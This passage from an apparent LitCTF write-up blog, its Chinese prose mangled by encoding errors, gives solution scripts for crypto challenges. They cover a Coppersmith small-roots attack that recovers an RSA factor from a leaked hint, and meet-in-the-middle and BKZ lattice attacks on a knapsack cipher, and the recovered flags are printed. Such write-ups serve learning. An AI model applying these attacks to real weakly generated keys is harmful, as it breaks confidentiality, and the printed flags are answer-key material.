class="built_in">print</span>(k.bit_length())</span><br></pre></td></tr></table></figure>
<p>ç®—å‡ºkçš„ä½æ•°æ˜¯98,æ¥ä¸‹æ¥ç›´æ¥å¥—ç”¨äºŒå…ƒcopperçš„æ¿å­å³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">1915595112993511209389477484497</span></span><br><span class="line">n = <span class="number">12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line">c = <span class="number">5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line">hint = <span class="number">10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line"></span><br><span class="line">P.&lt;temp_low,k&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#(hint&lt;&lt;180+temp_low)*e-1+k=k*p</span></span><br><span class="line">f = (hint*<span class="number">2</span>**<span class="number">180</span>+temp_low)*e-<span class="number">1</span>+k</span><br><span class="line"></span><br><span class="line">temp_low,k=small_roots(f,[<span class="number">2</span>**<span class="number">180</span>,<span class="number">2</span>**<span class="number">98</span>],<span class="number">1</span>,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">temp=hint*<span class="number">2</span>**<span class="number">180</span>+temp_low</span><br><span class="line">p=(temp*e-<span class="number">1</span>+k)//k</span><br><span class="line">q=n//<span class="built_in">int</span>(p)</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,<span class="built_in">int</span>(phi))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line">s</span><br><span class="line"><span class="comment">#LitCTF&#123;03ecda15d1a89b06454c6050c1bd489f&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œrsaè§£å¯†çš„æ—¶å€™ä¹Ÿå¯ä»¥ä¸ç”¨phi,ç›´æ¥ç”¨pæˆ–è€…q</p>
<h3 id="new-bag"><a href="#new-bag" class="headerlink" title="new_bag"></a>new_bag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">length</span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;LitCTF&#123;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flag.encode()</span><br><span class="line"></span><br><span class="line">flag = get_flag(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag = <span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">pubkey = [getPrime(<span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]</span><br><span class="line">enc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    enc += pubkey[i] * <span class="built_in">int</span>(flag[i])</span><br><span class="line">    enc %= p</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;pubkey = <span class="subst">&#123;pubkey&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;enc = <span class="subst">&#123;enc&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>æ€è·¯ï¼šå› ä¸ºåªæœ‰8ä¸ªå­—èŠ‚ï¼Œæ¯ä¸ªå­—èŠ‚æœ‰63ç§å¯èƒ½ï¼Œæ€»å…±<script type="math/tex">63^{8} \approx 2^{48}</script>ç§å¯èƒ½,åˆ†å·¦å³ä¸¤éƒ¨åˆ†ä¸­é—´äººæ”»å‡»ï¼Œåªæœ‰<script type="math/tex">2^{24}</script>ç§å¯èƒ½ï¼Œå®Œå…¨å¯ä»¥çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åªæœ‰8å­—èŠ‚,ä¸”æ¯å­—ç¬¦ä»…63ï¼Œæ€»å…±63**8~2**48ç§å¯èƒ½</span></span><br><span class="line"><span class="comment"># åˆ†å·¦å³ä¸¤éƒ¨åˆ†ä¸­é—´äººæ”»å‡»ï¼Œåªæœ‰2**24ç§å¯èƒ½ï¼Œå®Œå…¨å¯ä»¥çˆ†ç ´</span></span><br><span class="line"><span class="comment">#MITM</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = <span class="number">173537234562263850990112795836487093439</span></span><br><span class="line">pubkey = [<span class="number">184316235755254907483728080281053515467</span>, <span class="number">301753295242660201987730522100674059399</span>, <span class="number">214746865948159247109907445342727086153</span>, <span class="number">190710765981032078577562674498245824397</span>, <span class="number">331594659178887289573546882792969306963</span>, <span class="number">325241251857446530306000904015122540537</span>, <span class="number">183138087354043440402018216471847480597</span>, <span class="number">184024660891182404534278014517267677121</span>, <span class="number">221852419056451630727726571924370029193</span>, <span class="number">252122782233143392994310666727549089119</span>, <span class="number">175886223097788623718858806338121455451</span>, <span class="number">275410728642596840638045777234465661687</span>, <span class="number">251664694235514793799312335012668142813</span>, <span class="number">218645272462591891220065928162159215543</span>, <span class="number">312223630454310643034351163568776055567</span>, <span class="number">246969281206041998865813427647656760287</span>, <span class="number">314861458279166374375088099707870061461</span>, <span class="number">264293021895772608566300156292334238719</span>, <span class="number">300802209357110221724717494354120213867</span>, <span class="number">293825386566202476683406032420716750733</span>, <span class="number">280164880535680245461599240490036536891</span>, <span class="number">223138633045675121340315815489781884671</span>, <span class="number">194958151408670059556476901479795911187</span>, <span class="number">180523100489259027750075460231138785329</span>, <span class="number">180425435626797251881104654861163883059</span>, <span class="number">313871202884226454316190668965524324023</span>, <span class="number">184833541398593696671625353250714719537</span>, <span class="number">217497008601504809464374671355532403921</span>, <span class="number">246589067140439936215888566305171004301</span>, <span class="number">289015788017956436490096615142465503023</span>, <span class="number">301775305365100149653555500258867275677</span>, <span class="number">185893637147914858767269807046039030871</span>, <span class="number">319328260264390422708186053639594729851</span>, <span class="number">196198701308135383224057395173059054757</span>, <span class="number">231185775704496628532348037721799493511</span>, <span class="number">243973313872552840389840048418558528537</span>, <span class="number">213140279661565397451805047456032832611</span>, <span class="number">310386296949148370235845491986451639013</span>, <span class="number">228492979916155878048849684460007011451</span>, <span class="number">240557187581619139147592264130657066299</span>, <span class="number">187388364905654342761169670127101032713</span>, <span class="number">305292765113810142043496345097024570233</span>, <span class="number">303823809595161213886303993298011013599</span>, <span class="number">227663140954563126349665813092551336597</span>, <span class="number">257833881948992845466919654910838972461</span>, <span class="number">291249161813309696736659661907363469657</span>, <span class="number">228470133121759300620143703381920625589</span>, <span class="number">337912208888617180835513160742872043511</span>, <span class="number">252639095930536359128379880984347614689</span>, <span class="number">306613178720695137374121633131944714277</span>, <span class="number">328627523443531702430603855075960220403</span>, <span class="number">283995291614222889691668376952473718279</span>, <span class="number">185992200035693404743830210660606140043</span>, <span class="number">175575945935802771832062328390060568381</span>, <span class="number">239709736751531517044198331233711541211</span>, <span class="number">325191992201185112802734343474281930993</span>, <span class="number">285825734319916654888050222626163129503</span>, <span class="number">260820892372814862728958615462018022903</span>, <span class="number">271109638409686342632742230596810197399</span>, <span class="number">195432366301516284662210689868561107229</span>, <span class="number">252351678712166898804432075801905414141</span>, <span class="number">175869608753229067314866329908981554323</span>, <span class="number">212291732707466211705141589249474157597</span>, <span class="number">299891357045144243959903067354676661051</span>, <span class="number">271237385422923460052644584552894282763</span>, <span class="number">268702576849722796315440463412052409241</span>, <span class="number">198273535005705777854651218089804228523</span>, <span class="number">177684355989910045168511400849036259973</span>, <span class="number">189237944200991357454773904466163557789</span>, <span class="number">175427967765368330787115337317676160499</span>, <span class="number">270446056495616077936737430232108222303</span>, <span class="number">243318639972702711024520926308402316247</span>, <span class="number">223872107662231922057872197123261908053</span>, <span class="number">268995355861070998347238198063073079851</span>, <span class="number">244478236168888494353493404999149985963</span>, <span class="number">230731375083676409248450208772518041369</span>, <span class="number">231630208287176700035265642824425872113</span>, <span class="number">187649298194887119502654724235771449423</span>, <span class="number">264924369987111619306245625770849264491</span>, <span class="number">327092811483332202721992798797117253283</span>, <span class="number">274967838920225995524024619709213673571</span>, <span class="number">313836314009366857157961838519499192671</span>, <span class="number">181860768653760352435352944732117309357</span>, <span class="number">184011200837375425882494435177626368109</span>, <span class="number">246455975565763627776562816894916143559</span>, <span class="number">262208917125258935991543552004318662109</span>, <span class="number">334006940602786701813813048552124976177</span>, <span class="number">241119397420390120456580389194328607351</span>, <span class="number">255370083166310325724283692646412327547</span>, <span class="number">280056982387584554076672702548437488901</span>, <span class="number">190822826881447578202544631446213911541</span>, <span class="number">206119293866065537243159766877834200177</span>, <span class="number">289535246575130471484249052043282790337</span>, <span class="number">222004375767927951747133364917437739627</span>, <span class="number">186041951615746748538744491355290007923</span>, <span class="number">299120276948597373232905692530626175519</span>, <span class="number">268645812049699572580085139845553457511</span>, <span class="number">231990902203442306941381714523426756489</span>, <span class="number">259677531562170067444672097354970172129</span>, <span class="number">232573792063456357545735601063504090387</span>, <span class="number">268451806037215206985127877726665463011</span>, <span class="number">324266632324016349795115268035757999593</span>, <span class="number">323952615081869295386415078624753400501</span>, <span class="number">302316593553669781596237136546083536339</span>, <span class="number">235576231941572491681115931798290883659</span>, <span class="number">202271277470197960243533508432663735031</span>, <span class="number">172391954991101354275650988921310984563</span>, <span class="number">215333185856183701105529790905068832303</span>, <span class="number">335916893044781805453250006520700519353</span>, <span class="number">217268288923298532517983372665872329797</span>, <span class="number">265455575922780577837866687874732212733</span>, <span class="number">182194442259001995170676842797322170297</span>, <span class="number">180222796978664332193987060700843734759</span>, <span class="number">332629077640484670095070754759241249101</span>, <span class="number">238815683708676274248277883404136375767</span>, <span class="number">246167709707533867216616011486975023679</span>, <span class="number">188375282015595301232040104228085154549</span>, <span class="number">230675799347049231846866057019582889423</span>, <span class="number">290911573230654740468234181613682439691</span>, <span class="number">173178956820933028868714760884278201561</span>, <span class="number">340087079300305236498945763514358009773</span>, <span class="number">215775253913162994758086261347636015049</span>, <span class="number">286306008278685809877266756697807931889</span>, <span class="number">175231652202310718229276393280541484041</span>, <span class="number">230887015177563361309867021497576716609</span>, <span class="number">306478031708687513424095160106047572447</span>, <span class="number">172289054804425429042492673052057816187</span>]</span><br><span class="line">enc = <span class="number">82516114905258351634653446232397085739</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¡«å……ç©ºå­—èŠ‚å»æ‰å¤´å°¾LitCTF&#123;å’Œ&#125;</span></span><br><span class="line">enc2 = enc-<span class="built_in">sum</span>([pubkey[i]*<span class="built_in">int</span>(<span class="built_in">bin</span>(bytes_to_long(<span class="string">b&#x27;LitCTF&#123;\0\0\0\0\0\0\0\0&#125;&#x27;</span>))[<span class="number">2</span>:][i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>)])</span><br><span class="line">enc2 = <span class="built_in">int</span>(enc2%p)</span><br><span class="line"></span><br><span class="line">tab = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#å‰4å­—èŠ‚æ‰€æœ‰å¯èƒ½ç”Ÿæˆä¸€ä¸ªå­—å…¸</span></span><br><span class="line">left = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> itertools.product(tab, repeat=<span class="number">4</span>):    </span><br><span class="line">    s = <span class="built_in">bin</span>(bytes_to_long(<span class="string">&#x27;&#x27;</span>.join(v).encode()))[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    e1 = <span class="built_in">sum</span>([<span class="built_in">int</span>(s[i])*pubkey[<span class="number">55</span>+i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])%p</span><br><span class="line">    left[e1]=<span class="string">&#x27;&#x27;</span>.join(v)</span><br><span class="line"><span class="built_in">print</span>(left)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å4å­—èŠ‚</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> itertools.product(tab, repeat=<span class="number">4</span>):    </span><br><span class="line">    s = <span class="built_in">bin</span>(bytes_to_long(<span class="string">&#x27;&#x27;</span>.join(v).encode()))[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    e2 = (enc2 - <span class="built_in">sum</span>([<span class="built_in">int</span>(s[i])*pubkey[<span class="number">55</span>+<span class="number">32</span>+i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]))%p</span><br><span class="line">    <span class="keyword">if</span> e2 <span class="keyword">in</span> left:</span><br><span class="line">        <span class="built_in">print</span>(left[e2]+<span class="string">&#x27;&#x27;</span>.join(v))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#Am3xItsT</span></span><br><span class="line"><span class="comment">#LitCTF&#123;Am3xItsT&#125;</span></span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•ï¼šä½¿ç”¨BKZ(block_size=25)ï¼Œå°†èƒŒåŒ…é—®é¢˜è½¬åŒ–ä¸ºå¯»æ‰¾æ ¼ä¸­çš„çŸ­å‘é‡é—®é¢˜</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_flag</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.startswith(<span class="string">b&#x27;LitCTF&#123;&#x27;</span>) <span class="keyword">or</span> <span class="keyword">not</span> s.endswith(<span class="string">b&#x27;&#125;&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    allowed_chars = <span class="built_in">set</span>(<span class="string">b&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(c <span class="keyword">in</span> allowed_chars <span class="keyword">for</span> c <span class="keyword">in</span> s[<span class="number">7</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">p, pubkey, enc, prefix=<span class="string">b&#x27;LitCTF&#123;&#x27;</span>, suffix=<span class="string">b&#x27;&#125;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        prefix_bits = <span class="built_in">bin</span>(bytes_to_long(prefix))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(prefix_bits)):</span><br><span class="line">            enc = (enc - pubkey[i] * <span class="built_in">int</span>(prefix_bits[i])) % p</span><br><span class="line"></span><br><span class="line">        suffix_bits = <span class="built_in">bin</span>(bytes_to_long(suffix))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">8</span>, <span class="number">0</span>):</span><br><span class="line">            enc = (enc - <span class="built_in">int</span>(suffix_bits[i+<span class="number">8</span>]) * pubkey[i]) % p</span><br><span class="line"></span><br><span class="line">        mid_pubkey = pubkey[<span class="built_in">len</span>(prefix_bits):-<span class="number">8</span>]</span><br><span class="line">        n = <span class="built_in">len</span>(mid_pubkey)</span><br><span class="line"></span><br><span class="line">        Ge = Matrix(ZZ, n + <span class="number">2</span>, n + <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            Ge[i, i] = <span class="number">1</span></span><br><span class="line">            Ge[i, -<span class="number">1</span>] = mid_pubkey[i]</span><br><span class="line">        Ge[-<span class="number">2</span>, -<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">        Ge[-<span class="number">2</span>, -<span class="number">1</span>] = enc</span><br><span class="line">        Ge[-<span class="number">1</span>, -<span class="number">1</span>] = p</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> vec <span class="keyword">in</span> Ge.BKZ(block_size=<span class="number">25</span>): </span><br><span class="line">            <span class="keyword">if</span> vec[-<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            bits = []</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> vec[:-<span class="number">2</span>]:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">abs</span>(x) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">                    valid = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                bits.append(<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            mid_bits = <span class="string">&#x27;&#x27;</span>.join(bits)</span><br><span class="line">            full_bits = prefix_bits + mid_bits + suffix_bits</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                flag = long_to_bytes(<span class="built_in">int</span>(full_bits, <span class="number">2</span>))</span><br><span class="line">                <span class="keyword">if</span> validate_flag(flag):</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Attack failed: No valid solution found&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>.encode()</span><br><span class="line"></span><br><span class="line">p = <span class="number">173537234562263850990112795836487093439</span></span><br><span class="line">pubkey = [<span class="number">184316235755254907483728080281053515467</span>, <span class="number">301753295242660201987730522100674059399</span>, <span class="number">214746865948159247109907445342727086153</span>, <span class="number">190710765981032078577562674498245824397</span>, <span class="number">331594659178887289573546882792969306963</span>, <span class="number">325241251857446530306000904015122540537</span>, <span class="number">183138087354043440402018216471847480597</span>, <span class="number">184024660891182404534278014517267677121</span>, <span class="number">221852419056451630727726571924370029193</span>, <span class="number">252122782233143392994310666727549089119</span>, <span class="number">175886223097788623718858806338121455451</span>, <span class="number">275410728642596840638045777234465661687</span>, <span class="number">251664694235514793799312335012668142813</span>, <span class="number">218645272462591891220065928162159215543</span>, <span class="number">312223630454310643034351163568776055567</span>, <span class="number">246969281206041998865813427647656760287</span>, <span class="number">314861458279166374375088099707870061461</span>, <span class="number">264293021895772608566300156292334238719</span>, <span class="number">300802209357110221724717494354120213867</span>, <span class="number">293825386566202476683406032420716750733</span>, <span class="number">280164880535680245461599240490036536891</span>, <span class="number">223138633045675121340315815489781884671</span>, <span class="number">194958151408670059556476901479795911187</span>, <span class="number">180523100489259027750075460231138785329</span>, <span class="number">180425435626797251881104654861163883059</span>, <span class="number">313871202884226454316190668965524324023</span>, <span class="number">184833541398593696671625353250714719537</span>, <span class="number">217497008601504809464374671355532403921</span>, <span class="number">246589067140439936215888566305171004301</span>, <span class="number">289015788017956436490096615142465503023</span>, <span class="number">301775305365100149653555500258867275677</span>, <span class="number">185893637147914858767269807046039030871</span>, <span class="number">319328260264390422708186053639594729851</span>, <span class="number">196198701308135383224057395173059054757</span>, <span class="number">231185775704496628532348037721799493511</span>, <span class="number">243973313872552840389840048418558528537</span>, <span class="number">213140279661565397451805047456032832611</span>, <span class="number">310386296949148370235845491986451639013</span>, <span class="number">228492979916155878048849684460007011451</span>, <span class="number">240557187581619139147592264130657066299</span>, <span class="number">187388364905654342761169670127101032713</span>, <span class="number">305292765113810142043496345097024570233</span>, <span class="number">303823809595161213886303993298011013599</span>, <span class="number">227663140954563126349665813092551336597</span>, <span class="number">257833881948992845466919654910838972461</span>, <span class="number">291249161813309696736659661907363469657</span>, <span class="number">228470133121759300620143703381920625589</span>, <span class="number">337912208888617180835513160742872043511</span>, <span class="number">252639095930536359128379880984347614689</span>, <span class="number">306613178720695137374121633131944714277</span>, <span 